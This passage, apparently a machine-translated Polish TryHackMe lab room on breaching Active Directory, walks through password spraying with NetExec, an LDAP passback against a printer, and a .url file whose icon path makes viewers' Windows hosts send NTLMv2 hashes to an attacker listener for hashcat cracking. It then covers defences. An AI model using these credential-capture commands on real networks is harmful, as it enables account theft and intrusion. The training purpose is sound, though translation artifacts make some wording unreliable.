SMB 10.10.x.x 445 YOURDC [*] Windows Server 2022 Build 20348 x64 (name:RDC1) (domain:thm.loc) (signing:True) (SMBv1:False)
SMB 10.10.x.x 445 YOURDC [-] thm.loc\jane.smith:MegaCorp01! STATUS_LOGON_FAILURE
SMB 10.10.x.x 445 YOURDC [-] thm.loc\bob.taylor:MegaCorp01! STATUS_LOGON_FAILURE
SMB 10.10.x.x 445 YOURDC [+] thm.loc\alice.moore:MegaCorp01!
SMB 10.10.x.x 445 YOURDC [-] thm.loc\charlie.davis:MegaCorp01! STATUS_LOGON_FAILURE
SMB 10.10.x.x 445 YOURDC [-] thm.loc\eve.wilson:MegaCorp01! STATUS_ACCOUNT_DISABLED
SMB 10.10.x.x 445 YOURDC [-] thm.loc\frank.brown:MegaCorp01! STATUS_LOGON_FAILURE
[...SNIP...]
```

## Interpretacja wyników

Dane wyjściowe na pierwszy rzut oka pokazują nam kilka rzeczy:

- `[+]`: Pomyślne uwierzytelnienie. Kombinacja nazwy użytkownika i hasła jest prawidłowa. To jest nasz cel — zhakowane dane uwierzytelniające.
- `[-] STATUS_LOGON_FAILURE`: Hasło do tego konta jest nieprawidłowe. Jest to oczekiwana odpowiedź dla większości kont podczas ataku sprayem.
- `[-] STATUS_ACCOUNT_DISABLED`: Konto istnieje, ale zostało wyłączone. Nie jest to liczone jako nieudana próba logowania, więc nie będzie się to wiązać z blokadą, ale nie możemy z niego korzystać.
- `[-] STATUS_ACCOUNT_LOCKED_OUT`: Konto zostało zablokowane. Jeśli widzisz ten komunikat, **natychmiast przerwij rozpylanie** – możesz powodować blokady. Zapoznaj się z zasadami blokowania i dostosuj swoje podejście.
- `(Pwn3d!)`:Jeśli pojawi się to po pomyślnym zalogowaniu, konto ma uprawnienia administratora lokalnego na hoście docelowym. To jeszcze większa korzyść niż w przypadku standardowego użytkownika domeny.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765215788)

**Wskazówka:** Jeśli zauważysz problem  `STATUS_ACCOUNT_LOCKED_OUT` na którymś z kont podczas sprayu, przerwij i sprawdź. Możesz również użyć  `--jitter` flagi NetExec, aby wprowadzić losowe opóźnienia między próbami uwierzytelnienia, zmniejszając ryzyko zablokowania konta i wykrycia: `nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5`

## Inne cele oprysku

W tym zadaniu przeprowadziliśmy atak sprayem na SMB na kontrolerze domeny. Jednak atak sprayem haseł może być również skierowany na inne usługi zintegrowane z usługą Active Directory, w tym Outlook Web Access (OWA), RDP, portale VPN i LDAP. Te alternatywne cele zostaną omówione w kolejnych salach. NetExec obsługuje wiele z tych protokołów natywnie. Można po prostu zamienić `SMB`, `RDP`, `LDAP`lub `WinRM`w `MSSQL`składni polecenia.

## Wprowadzenie do przymusu uwierzytelniania

Do tej pory omawialiśmy techniki polegające na odkrywaniu istniejących danych uwierzytelniających lub ich zgadywaniu. W tym zadaniu przyjrzymy się innemu podejściu, zwanemu **atakami z wymuszeniem** . Zamiast wyszukiwania danych uwierzytelniających lub rozsyłania haseł, wymuszenie polega na oszukaniu urządzenia lub użytkownika, aby wysłał dane uwierzytelniające do kontrolowanego przez atakującego odbiornika. To odwzorowuje…[MITRATechnika ATT&CK T1187 (wymuszone uwierzytelnianie)(otwiera się w nowej karcie)](https://attack.mitre.org/techniques/T1187/).

Omówimy dwie przyjazne dla początkujących techniki przymusu:**LDAPatak typu passback** na błędnie skonfigurowaną drukarkę sieciową i **wymuszenie oparte na plikach** w zapisywalnych udziałach.

---

## Czym jest atak LDAP Passback?

Wiele urządzeń sieciowych, takich jak drukarki, skanery i urządzenia wielofunkcyjne (MFP), integruje się z Active Directory za pośrednictwem protokołu LDAP, aby obsługiwać funkcje takie jak skanowanie do wiadomości e-mail, wyszukiwanie w książce adresowej i uwierzytelnianie użytkowników na panelu urządzenia. Aby to umożliwić, urządzenie przechowuje zestaw danych uwierzytelniających LDAP (zazwyczaj konto usługi), których używa do powiązania z kontrolerem domeny i wykonywania zapytań katalogowych.

Atak LDAP passback wykorzystuje to, przekierowując połączenie LDAP urządzenia do nasłuchiwacza kontrolowanego przez atakującego. Schemat ataku jest prosty:

1. Uzyskaj dostęp do internetowego interfejsu administracyjnego urządzenia (wbudowana usługa internetowa), często korzystając z domyślnych lub słabych danych logowania.
2. Przejdź do strony konfiguracji LDAP.
3. Zastąp prawidłowy adres IP serwera LDAP adresem IP maszyny atakującej.
4. Uruchom test połączenia, gdyż większość urządzeń posiada przycisk „Testuj połączenie” lub „Sprawdź połączenie” przeznaczony właśnie do tego celu.
5. Urządzenie wysyła zapisane dane uwierzytelniające LDAP do naszego programu nasłuchującego, a my je przechwytujemy.

## Dlaczego to działa?

Urządzenia wielofunkcyjne iIoTUrządzenia należą do najczęściej pomijanych zasobów podczas wzmacniania bezpieczeństwa. Typowe problemy obejmują:

- **Domyślne dane logowania administratora:** Urządzenia są wdrażane z domyślnymi danymi logowania ustawionymi fabrycznie i nigdy ich nie zmieniają. Typowe ustawienia domyślne to `admin:admin`(HP), `admin:`z pustym hasłem (Ricoh) i `ADMIN:canon`(Canon).
- **Konta usług o nadmiernych uprawnieniach:** Konto usługi LDAP jest czasami kontem administratora domeny, co znacznie przekracza wymagania dotyczące przeszukiwania katalogów.
- **Zwykły tekst LDAP (port 389):** Wiele urządzeń jest skonfigurowanych do używania niezaszyfrowanego protokołu LDAP, a nie protokołu LDAPS (port 636), co oznacza, że ​​dane uwierzytelniające są przesyłane w postaci zwykłego tekstu.
- **Brak rotacji danych uwierzytelniających:** hasła do kont usługowych w przypadku integracji urządzeń rzadko podlegają rotacji, co oznacza, że ​​przechwycone dane uwierzytelniające mogą pozostać ważne przez miesiące lub lata.

## Wykonywanie ataku

W laboratorium drukarka sieciowa jest dostępna z odsłoniętym panelem administracyjnym. Przeanalizujmy atak. Przejdź do aplikacji drukarki na [stronie http://printer.thm.loc/(otwiera się w nowej karcie)](http://printer.thm.loc/). 

Najpierw otwórz panel administracyjny drukarki (za pomocą `admin:admin`) w przeglądarce i znajdź stronę konfiguracji LDAP. Powinieneś zobaczyć aktualny adres IP i port serwera LDAP, a także nazwę użytkownika konta usługi. Pole hasła będzie ukryte, ale urządzenie nadal będzie je przechowywać wewnętrznie.

Zmień adres IP serwera LDAP na swój `tun0`adres IP i inny port (np. 3489) i naciśnij przycisk **„Zapisz ustawienia”** , aby zapisać te ustawienia przed kontynuowaniem. Przed uruchomieniem połączenia testowego należy skonfigurować program nasłuchujący (ang. listener) do przechwytywania danych uwierzytelniających. W przypadku urządzenia skonfigurowanego do korzystania z protokołu LDAP w postaci zwykłego tekstu na porcie 389, prosty program nasłuchujący Netcat często wystarcza:

```shell
user@attackbox:~$ nc -lvnp 3489
```

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Na porcie Attackbox `389`domyślny port LDAP jest już używany. Dlatego używamy`3489`

Wróć do panelu administracyjnego drukarki i kliknij  przycisk **„Testuj połączenie”** . Urządzenie spróbuje uwierzytelnić się w naszym programie nasłuchującym przy użyciu zapisanych danych logowania LDAP. W terminalu Netcat powinniśmy zobaczyć połączenie przychodzące z danymi logowania w wynikach:

Terminal

```powershell
user@attackbox:~$ nc -lvnp 3489
listening on [any] 389 ...
connect to [YOURIP] from (UNKNOWN) [PRINTERIP] 49562
0Y`T;CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc<REDACTED_PASSWORD>
```

Dane wyjściowe będą zawierać wyróżniającą nazwę (DN) konta usługi oraz hasło w postaci zwykłego tekstu. Dokładny format zależy od urządzenia, dlatego może być konieczne przeszukanie surowych danych w celu znalezienia ciągu uwierzytelniającego.

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Niektóre nowoczesne urządzenia negocjują uwierzytelnianie SASL lub LDAP w formacie TLS. W takim przypadku prosty nasłuch Netcata nie przechwyci danych uwierzytelniających w postaci zwykłego tekstu. W takich sytuacjach konieczne byłoby skonfigurowanie nieautoryzowanego serwera LDAP (np. za pomocą `slapd`Impacket `ldapd.py`), który obsłuży negocjację i przechwyci dane uwierzytelniające powiązania. W tym przypadku urządzenie docelowe korzysta z LDAP w postaci zwykłego tekstu, więc Netcat jest wystarczający.

## Weryfikacja przechwyconych danych uwierzytelniających

Mając przechwyconą nazwę użytkownika i hasło, możemy sprawdzić poprawność danych uwierzytelniających za pomocą programu NetExec:

Terminal

```shell
user@attackbox:~$ nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'

SMB   192.168.x.x  445  YOURDC  [*] Windows Server 2022 Build 20348 x64 (name:YOURDC) (domain:thm.loc) (signing:True) (SMBv1:False)
SMB   192.168.x.x  445  YOURDC  [-] thm.loc\svc.ldap:CAPTURED_PASSWORD STATUS_ACCOUNT_DISABLED
```

A `[-]`potwierdza prawidłowe dane logowania do domeny, ale niestety to konto jest wyłączone. Nieważne, są inne sposoby na naruszenie bezpieczeństwa!

---

## Czym jest przymus oparty na plikach?

Wymuszanie uwierzytelniania oparte na plikach wykorzystuje inne podejście do wymuszania uwierzytelniania. Zamiast rekonfigurować urządzenie, umieszczamy specjalnie spreparowany plik w zapisywalnym udziale sieciowym. Gdy użytkownik przegląda ten udział za pomocą Eksploratora Windows, system operacyjny automatycznie próbuje wyświetlić ikonę pliku. Jeśli ścieżka do ikony wskazuje na ścieżkę UNC na komputerze atakującego (np. `\\TUN0_IP\share\icon.ico`), system Windows podąży tą ścieżką i wyśle ​​skrót NTLMv2 użytkownika przeglądającego do naszego odbiornika, a wszystko to bez otwierania ani klikania pliku przez użytkownika.

Działa to, ponieważ Eksplorator Windows renderuje ikony i miniatury plików w katalogu zaraz po jego otwarciu. Niektóre typy plików, w tym `.url`pliki skrótów internetowych, dopuszczają  `IconFile`pole określające, skąd ma zostać załadowana ikona. Jeśli to pole zawiera ścieżkę UNC do hosta zewnętrznego, system Windows po cichu zainicjuje próbę uwierzytelnienia SMB na tym hoście, ujawniając skrót NTLMv2 użytkownika.

![Atak przymusowy](https://cdn-images.tryhackme.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1778578953501.png)

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Uwaga:** Historycznie, `.scf`(plik poleceń powłoki) i `desktop.ini`pliki były używane w tym samym ataku. Jednak Microsoft załatał te wektory w w pełni zaktualizowanych systemach Windows 10 i 11. `.url`Pliki pozostają skuteczne w obecnych wersjach systemu Windows i są zalecaną techniką w tym ataku.

## Tworzenie złośliwego pliku .url

Składnia pliku `.url`jest minimalna i obejmuje zaledwie kilka wierszy w formacie INI:

```shell
user@attackbox:~$ cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

![](https://cdn-images.tryhackme.com/room-icons/68d2c1e7ab94268f6271de1d-1771765213861)

**Ważne** : `'EOF'`(z cudzysłowami) jest celowe. Bez cudzysłowów bash zinterpretuje podwójne ukośniki odwrotne w ścieżce IconFile jako pojedyncze, co spowoduje nieprawidłową ścieżkę UNC, która nie uruchomi uwierzytelniania.

Omówmy to szczegółowo:

- `[InternetShortcut]`: Nagłówek typu pliku.
- `URL`:Adres URL, do którego ma prowadzić skrót (może to być cokolwiek — nie jest to mechanizm przymusu).
- `WorkingDirectory`:Katalog roboczy skrótu.
- `IconFile`: To pole jest krytyczne. Ścieżka UNC w tym miejscu spowoduje, że system Windows spróbuje uwierzytelnić się za pomocą protokołu SMB na komputerze atakującego, gdy będzie próbował załadować ikonę.
- `IconIndex`:Indeks ikony w pliku (wartość standardowa).

Zwróć uwagę na nazwę pliku: **`@Shortcut.url`**. Znak wiodący `@`zapewnia, że ​​plik pojawi się na górze listy katalogów w Eksploratorze Windows, co oznacza, że ​​będzie jednym z pierwszych renderowanych plików, maksymalizując szansę na załadowanie ikony zaraz po otwarciu folderu udostępnionego przez użytkownika.

## Konfigurowanie Respondera

Przed umieszczeniem pliku w udziale potrzebujemy nasłuchiwacza, który przechwyci skróty NTLMv2. [Odpowiadający(otwiera się w nowej karcie)](https://github.com/lgandx/Responder)jest narzędziem do tego celu, nasłuchuje wielu protokołów i przechwytuje materiał uwierzytelniający:

Terminal

```shell
user@attackbox:~$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.x.x.x

[+] Listening for events...
```

Obiekt Responder będzie nasłuchiwał m.in. na porcie 445 (SMB) i przechwytywał wszystkie skróty NTLMv2 wysyłane do naszego komputera.

## Umieszczanie pliku i przechwytywanie skrótu

Teraz prześlij złośliwy `.url`plik do udziału z możliwością zapisu. Możesz użyć komendy `smbclient`, aby połączyć się z udziałem i przesłać plik:

```shell
user@attackbox:~$ smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
smb: \> put @Shortcut.url
putting file @Shortcut.url as \@Shortcut.url (X.X kb/s) (average X.X kb/s)
smb: \> exit
```

Teraz czekamy. Gdy użytkownik przegląda udział (w tym laboratorium symulowany użytkownik będzie okresowo przeglądał udział), Eksplorator Windows spróbuje załadować ikonę z naszej ścieżki UNC. W terminalu Responder powinniśmy zobaczyć przechwycony skrót NTLMv2:

```shell
[SMB] NTLMv2-SSP Client   : 192.168.x.x
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]
```

Zdobyliśmy skrót NTLMv2. Jednak w przeciwieństwie do ataku LDAP passback, w którym uzyskaliśmy hasło w postaci zwykłego tekstu, jest to **skrót Net-NTLMv2,** którego nie można bezpośrednio wykorzystać do ataków pass-the-hash. Musimy go złamać offline.

### Rozbijanie haszu za pomocą Hashcat

Przed złamaniem hasha musimy go zapisać do pliku. W tym przykładzie zapisaliśmy go w `hash.txt`. Możemy złamać hash NTLMv2 za pomocą [Hashcata.(otwiera się w nowej karcie)](https://hashcat.net/hashcat/)z trybem `5600`(NetNTLMv2):

Terminal

```shell
user@attackbox:~$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

SARAH.JONES::THM:1122334455667788:A1B2C3D4E5F6...[SNIP]:CRACKED_PASSWORD

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

Po złamaniu będziemy mieli kolejny ważny zestawOGŁOSZENIEdane uwierzytelniające uzyskane bez ujawniania hasła lub ujawniania tajnych informacji.

---

## Notatka na temat zaawansowanych technik przymusu

Dwie techniki omówione w tym zadaniu to zaledwie wierzchołek góry lodowej, jeśli chodzi o wymuszanie uwierzytelniania. Bardziej zaawansowane techniki, takie jak PetitPotam, PrinterBug/SpoolSample i DFSCoerce, mogą zmusić kontrolery domeny i inne maszyny o wysokiej wartości do uwierzytelnienia się na serwerze nasłuchującym kontrolowanym przez atakującego. W połączeniu z atakami relay (w których przechwycone uwierzytelnienie jest przekazywane dalej, zamiast je łamać), techniki te tworzą jedne z najpotężniejszych łańcuchów ataków na usługi Active Directory dostępnych obecnie na rynku. Zostaną one szczegółowo omówione w dedykowanych salach w dalszej części modułu.

Teraz, gdy poznaliśmy kilka technik łamania zabezpieczeń,OGŁOSZENIEW kontekście środowiska, zmieńmy perspektywę i przyjrzyjmy się, jak organizacje mogą się przed nim bronić. Zrozumienie mechanizmów ograniczających ryzyko nie tylko czyni Cię lepszym obrońcą, ale także lepszym atakującym. Wiedza o tym, jakich środków kontroli się spodziewać, pomoże Ci zidentyfikować ich brak i odpowiednio dostosować swoje podejście.

Poniżej znajduje się podsumowanie środków obronnych powiązanych z każdą techniką wyważenia omówioną w tym pomieszczeniu.

## Zarządzanie sekretami

Poświadczenia wGitrepozytoria,CI/płyta CDDzienniki kompilacji i pliki konfiguracyjne były jednymi z najłatwiejszych do osiągnięcia w naszym zaangażowaniu. Aby temu zaradzić, konieczne jest zdyscyplinowane podejście do zarządzania sekretami:

- Użyj dedykowanego magazynu sekretów (takiego jak HashiCorp Vault, Azure Key Vault lubAWSSecrets Manager) do przechowywania i pobierania danych uwierzytelniających, a nieosadzanieje w kodzie źródłowym lub plikach konfiguracyjnych.
- Wdrażaj haki pre-commit za pomocą narzędzi takich jak TruffleHog lub Gitleaks, aby skanować poufne informacje przed ich zatwierdzeniem w systemie kontroli wersji.
- Regularnie audytuj istniejące repozytoria pod kątem historycznego ujawnienia danych uwierzytelniających. Pamiętaj, że sekret usunięty w ostatnim zatwierdzeniu nadal istnieje w historii Gita.
- Natychmiast wymień dane uwierzytelniające po wykryciu wycieku. Samo usunięcie tajnego klucza z kodu nie wystarczy; stare dane uwierzytelniające muszą zostać unieważnione.
- Zamaskuj lub usuń sekrety wCI/CDrejestruj wyniki budowy i ogranicz dostęp do nich wyłącznie do upoważnionego personelu.

## Zasady dotyczące haseł i blokada konta

Rozpylanie haseł okazało się skuteczne, ponieważ użytkownicy wybierali przewidywalne hasła, które na papierze spełniały wymagania dotyczące złożoności, ale w praktyce były łatwe do odgadnięcia. Silna polityka haseł powinna obejmować:

- Minimalna długość hasła to 14 lub więcej znaków. Długość jest o wiele bardziej efektywna niż sama złożoność.
- Zakaz używania popularnych haseł i wzorców charakterystycznych dla danej organizacji (np. nazwa firmy + rok, pora roku + rok) za pomocą niestandardowych list zakazanych haseł. Ochrona haseł w usłudze Azure AD i podobne narzędzia mogą to wymusić.
- Unikaj stosowania domyślnych haseł dla nowych kont w całej organizacji. Każde nowe konto powinno otrzymać unikalne, losowo generowane hasło początkowe.
- Ostrożne konfigurowanie progów blokady konta. Zbyt niski próg (np. 3 próby) powoduje zakłócenia w działaniu; zbyt wysoki (np. 50 prób) daje atakującym pole do swobodnego ataku. Próg 5–10 prób z 30-minutowym oknem obserwacji to standardowy kompromis.
- Monitorowanie rozproszonych błędów uwierzytelniania na wielu kontach. Jest to sygnatura ataku sprayem na hasło i powinno wywołać alert, nawet jeśli żadne konto nie osiągnie progu blokady.

## Utwardzanie urządzeń

TenLDAPAtak passback opierał się wyłącznie na drukarce z domyślnymi danymi uwierzytelniającymi i jawną konfiguracją LDAP. Wzmocnienie urządzeń sieciowych obejmuje:

- Zmiana domyślnych danych administracyjnych na wszystkich urządzeniach sieciowych, w tym drukarkach, skanerach, urządzeniach wielofunkcyjnych iIoTurządzeń przed wdrożeniem.
- Używanie protokołu LDAPS (port 636) zamiast zwykłego tekstu LDAP (port 389) we wszystkich integracjach katalogowych. Gdy ruch LDAP jest szyfrowany, atak typu passback przechwytuje zaszyfrowaną sesję zamiast zwykłego tekstu uwierzytelniającego.
- Ograniczanie dostępu do interfejsów administratora urządzenia za pomocą adresu IP lub sieci VLAN. Interfejsy te nie powinny być dostępne z sieci zwykłych użytkowników.
- Do integracji urządzeń z LDAP należy używać dedykowanych kont usługowych o niskich uprawnieniach, nigdy konta administratora domeny ani innego konta o wysokich uprawnieniach. Konto usługowe powinno mieć dostęp tylko do odczytu, ograniczony do określonych obiektów katalogowych potrzebnych urządzeniu (np. wyszukiwania w książce adresowej).
- Włączanie urządzeń sieciowych do regularnych programów skanowania pod kątem luk w zabezpieczeniach i zarządzania zasobami.

## Bezpieczeństwo udostępniania plików

Wymuszenie oparte na plikach było możliwe, ponieważ udział miał zbyt szerokie uprawnienia do zapisu. Zabezpieczenie udziałów plików wymaga:

- Egzekwowanie zasady najmniejszych uprawnień w zakresie uprawnień do udziałów. Użytkownicy powinni mieć dostęp do zapisu w udziałach tylko wtedy, gdy go rzeczywiście potrzebują.
- Udostępnione dane monitorujące pod kątem podejrzanych typów plików, takich jak `.url`, `.lnk`, `.scf`i `desktop.ini`, powinny rzadko pojawiać się w udostępnionych danych i mogą być oznaczane przez monitorowanie integralności plików lub reguły wykrywania punktów końcowych.
- Audyt dostępu do zasobów w celu wykrycia nietypowych wzorców, takich jak pojawienie się nowego pliku i następująca po nim seria prób uwierzytelnienia SMB na zewnętrznym adresie IP.

## Hartowanie NTLM

Atak wymuszający dostęp do plików przechwycił skrót NTLMv2, ponieważ komputer ofiary automatycznie próbował uwierzytelnić się za pomocą NTLM na naszym urządzeniu nasłuchującym kontrolowanym przez atakującego. Wzmocnienie NTLM obejmuje:

- Całkowite wyłączenie NTLMv1 i wymuszenie NTLMv2 jako minimalnego poziomu uwierzytelniania za pomocą zasad grupy ( `Network Security: LAN Manager authentication level`ustawionych na „Wyślij tylko odpowiedź NTLMv2. Odrzuć LM iNTLM").
- EgzekwowanieMŚPpodpisywanie się na wszystkich maszynach domeny w celu zapobiegania atakom typu relay, polegającym na przechwytywaniu i przesyłaniu uwierzytelniania NTLM.
- Blokowanie ruchu wychodzącego SMB (TCP445) na obwodzie siecizapora sieciowaRzadko zdarza się, aby wewnętrzne stacje robocze nawiązywały połączenia SMB z zewnętrznymi adresami IP z uzasadnionych powodów.
- Dążymy do wycofania protokołu NTLM, gdzie to możliwe. Microsoft rozpoczął proces wycofywania protokołu NTLM na rzeczKerberosi organizacje powinny odpowiednio zaplanować migrację.

## SiećSegmentacjai kontroli dostępu

Wiele z technik opisanych w tym pomieszczeniu było możliwych dzięki temu, że usługi były dostępne z części sieci, w których nie było to konieczne. Ogólne środki zaradcze na poziomie sieci obejmują:

- Segmentacja sieci w celu umożliwienia dostępu do interfejsów zarządzania (paneli administracyjnych drukarek,Jenkinspulpity nawigacyjne, serwery Git) są dostępne wyłącznie z dedykowanych sieci VLAN do zarządzania.
- Ograniczanie dostępu do usług wewnętrznych, które nie muszą być powszechnie dostępne. Instancja Jenkinsa używana przez zespół programistów nie powinna być dostępna z ogólnej sieci korporacyjnej.
- Wymuszanie uwierzytelniania wieloskładnikowego (MFA) w usługach internetowych i krytycznych usługach wewnętrznych, takich jakVPNportale, poczta e-mail i bramy dostępu zdalnego. Uwierzytelnianie wieloskładnikowe (MFA) znacznie zmniejsza skutki złamania hasła, ponieważ samo poświadczenie nie jest już wystarczające do uwierzytelnienia.

## Wniosek

Brawo! Przeszedłeś od zerowych danych uwierzytelniających do wielu ważnych kont domenowych i zrobiłeś to kilkoma różnymi drogami. Taka jest rzeczywistość.OGŁOSZENIEwyważanie: rzadko wystarczy zastosować pojedynczą technikę, aby dostać się do środka. Drzwi otwiera połączenie rozpoznania, okazjonalnego odkrycia i kreatywnego przymusu.

Podsumujmy to, co omówiliśmy w tej sali:

- **OSINTi rozpoznanie:** zebraliśmy potencjalne nazwy użytkowników ze źródeł publicznych i zweryfikowaliśmy je pod kątem domeny, wykorzystując Kerbrute,Kerberoszachowanie przed uwierzytelnianiem w celu potwierdzenia, które konta istnieją, bez powodowania blokad.
- **Ujawnianie danych uwierzytelniających:** poszukiwaliśmy sekretów w często ujawnianych usługach.Gitrepozytoria z danymi uwierzytelniającymi ukrytymi w historii zatwierdzania iJenkinsprzypadki wycieku poufnych danych z dzienników kompilacji.
- **Rozpylanie haseł:** wzięliśmy pojedyncze hasło i rozpyliliśmy je na naszą listę zweryfikowanych nazw użytkowników za pomocą NetExec, nie przekraczając progu blokady, jednocześnie identyfikując konta ze słabymi lub domyślnymi hasłami.
- **LDAPpassback:** Wykorzystaliśmy błędnie skonfigurowaną drukarkę sieciową, przekierowując jej uwierzytelnianie LDAP do naszego programu nasłuchującego i przechwytując zapisane dane uwierzytelniające konta usługi w postaci zwykłego tekstu.
- **Przymus oparty na plikach:** Umieściliśmy złośliwy `.url`plik w zapisywalnym udziale, zmuszając komputer użytkownika do wysłania skrótu NTLMv2 do naszego odbiornika Responder. Następnie złamaliśmy skrót offline za pomocą Hashcata, aby odzyskać hasło w postaci zwykłego tekstu.

Każda z tych technik wskazała nam inny sposób działania, a podczas rzeczywistego starcia użyłbyś dowolnej kombinacji, jaką przedstawi ci otoczenie.

## Co dalej?

W tym pokoju omówiono szeroki **zakres zagadnień** związanych z naruszaniem AD. W kolejnych modułach pojawią się głębsze sale, które pogłębią wiedzę **,** zagłębiając się w techniki, które celowo pominęliśmy w tym miejscu:

- Sesje zerowe, dostęp gościa, anonimowe powiązania LDAP i wyliczanie SNMP
- Zaawansowane techniki przymusu: PetitPotam, PrinterBug/SpoolSample i DFSCoerce
- Ataki przekaźnikowe NTLMv1/v2 przekazują przechwycone uwierzytelnianie zamiast je łamać
- LLMNR/Zatruwanie NBT-NS w celu przechwytywania poświadczeń w sieci lokalnej
- Nadużycie rozruchu PXE i ekstrakcja poświadczeń MDT
- Wyzwanie wieńczące, łączące wszystkie techniki wyważania w jednym zadaniu

Zanim przejdziesz dalej, rozważ powrót do laboratorium i ponowne wypróbowanie technik. Powtarzanie buduje pamięć mięśniową, która oddziela czytanie o ataku od pewnego wykonania go w trakcie walki.
